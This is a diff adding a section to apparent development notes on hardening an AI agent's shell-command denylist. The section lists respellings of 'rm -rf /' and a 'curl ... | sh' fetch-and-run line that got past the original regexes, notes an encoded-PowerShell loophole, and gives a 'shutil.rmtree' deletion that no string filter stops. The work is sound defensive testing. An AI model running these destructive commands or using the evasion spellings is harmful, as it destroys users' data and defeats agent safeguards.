@@ -2574,3 +2574,80 @@ Python 605 passed / 7 skipped. TypeScript 383 tests, 382 pass with the
 `ComposerAttach` Windows flake. `test_build_scripts.py` fails 3-5 per run on
 unmodified code too -- it runs the real build script and depends on build
 freshness.
+
+## The sixth pass: the denylist, which Full made load-bearing
+
+### What the user asked for
+
+Keep `rm -rf /`, `format C:` and `shutdown` impossible at Full. They were
+already refused, and deliberately so -- but that turned out to be the least
+interesting thing about the request.
+
+### What probing it found
+
+At Full the allow-list no longer applies, so the denylist is the only thing
+between the agent and the machine. It was eight regexes matched with `re.search`
+against the raw command string. A probe of 25 spellings of the three forbidden
+operations found **11 that ran**, including:
+
+    rm -rf /        BLOCKED
+    rm -rf "/"      ran          -- one quote character from the blocked form
+    rm -r -f /      ran
+    rm --recursive --force /  ran
+    curl http://x.sh | sh    ran
+
+The last one is its own finding. The pattern was `curl\s+\|\s*sh`, which
+requires the pipe to touch `curl` -- and a real command has a URL in between, so
+**it could not match the thing it names**. It had been sitting in the list
+looking like protection. It did no harm while the allow-list blocked `curl`
+anyway; removing the allow-list is what made it load-bearing and wrong.
+
+### The fix
+
+`normalize_for_denylist` in `shell_tools.py` removes quotes, collapses
+whitespace, and strips `cmd /c` / `powershell -Command` wrappers (repeatedly,
+because the nesting is two deep in practice). The patterns were rewritten to
+describe the *operation* rather than one spelling: `rm` with a recursive flag in
+any form, `del/rd/rmdir /s`, `format` with or without a drive letter,
+`Stop-Computer`/`Restart-Computer`, `Remove-Item -Recurse`, and a pipe-to-shell
+pattern that can actually match one.
+
+Result: **0 of 25 get through**, and ordinary work still runs.
+
+### Two bugs the probe caught in my own change
+
+1. `powershell|pwsh\s+-command` binds the flag requirement to `pwsh` only, so
+   the first branch matched bare `powershell` and deleted the first word of
+   every PowerShell command before the denylist saw it.
+2. `-enc` was in the wrapper list. Unwrapping an encoded command leaves an
+   opaque base64 blob that no pattern can read, and it silently defeats the
+   pattern that exists to block it. An obfuscating flag is refused on sight,
+   never looked inside. Both now have a comment saying so.
+
+### The test has teeth, and an honest limit
+
+`_DENYLIST_DISGUISES` in `test_modes_and_diffs.py` is 33 spellings. Reverting the
+patterns to the original eight fails it. But `test_quoting_and_wrapping_do_not_
+change_what_a_command_is` documents the other half honestly: **normalisation is
+not what makes those 33 pass** -- the patterns are broad enough on their own,
+verified by disabling normalisation and watching the disguise test stay green. It
+earns its place for patterns *other people* write into `command_denylist`, which
+is a setting and would otherwise stop matching the day a path got quoted.
+
+`test_the_denylist_does_not_block_ordinary_work` is the other half of a
+boundary. `rm -f build.log` must still run: a denylist that blocked it would
+push the work into `python -c "shutil.rmtree(...)"`, which every level permits.
+
+### The gap this design cannot close
+
+`python -c "import shutil; shutil.rmtree('C:/')"` runs at Full, and no denylist
+over command strings will ever stop it. `python` is on the allow-list, so it ran
+before Full existed too -- but that is the point: **the denylist is a cheap
+inner ring, not the wall.** The wall is `ExecuteCommandTool`'s isolation gate
+(`isolation_required = True`, `fallback_to_local: False`), which means the
+command runs inside a container the agent cannot see out of. With Docker
+stopped, Full refuses everything rather than running it on the host, which is the
+designed behaviour.
+
+So: the honest description of Full is "any command, inside the sandbox, except
+the handful of machine-destroyers above". Do not describe it as safe on its own.
